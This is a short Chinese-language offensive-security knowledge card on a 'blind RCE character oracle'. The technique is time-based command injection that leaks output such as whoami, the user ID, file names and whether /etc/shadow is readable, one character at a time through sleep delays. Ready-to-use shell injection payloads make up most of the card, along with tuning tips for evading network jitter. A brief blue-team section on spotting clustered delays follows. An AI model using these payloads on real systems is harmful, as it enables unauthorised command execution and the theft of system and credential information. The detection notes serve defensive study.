---
title: "盲 RCE 字符预言机（自适应 sleep oracle）"
type: case-lesson
tags: [web-injection, rce, blind, oracle, command-injection]
date_created: 2026-10-06
sources: ["https://x.com/Zerodaylabowner"]
---

# 盲 RCE 字符预言机（adaptive sleep）

> 来源：@Zerodaylabowner（2026-10-04）—— 命令执行存在但无回显（或出网被封）时，用响应时间逐字符判定。

## 一行原型

```bash
; if [ $(whoami | cut -c 1) = "d" ]; then sleep 10; fi
```

- 条件成立 → 响应慢 10s；不成立 → 快回。`cut -c N` 逐位推进即可拼出 `whoami` / 文件名 / 主机名等。
- **基线先行**：先测 `; sleep 0` 与 `; sleep 10` 两端的量测噪声，再上条件式（避免把抖动当命中）。

## 变体

```bash
# 按位二进制（请求数更少）
; if [ $(( $(id -u) & 1 )) -eq 1 ]; then sleep 8; fi
# 文件/权限探测
; if [ -r /etc/shadow ]; then sleep 8; fi
# 自适应阈值：按上一步响应时间动态调 sleep 时长，绕网络抖动
```

## 何时用

- 命令注入 / 模板注入 / 上传后执行 —— **无回显、无外带通道**时的收尾手段。
- 穷举大字符集 → 二分比较；小字符集 → 顺序扫。

## 蓝方检测

- 同一端点出现**规律性 8–10s 延时簇**（且集中在少数请求）；
- 进程审计里 `sleep` / `timeout` 相关派生命令。

## 关联

- `sqli-minimal-probe-to-ato.md`（同源账号）；
- 注入面通用：`web-injection/` cmd/模板注入各卡 + OOB 外带卡（本库 `oob-exfil-kit` 思路互补）。
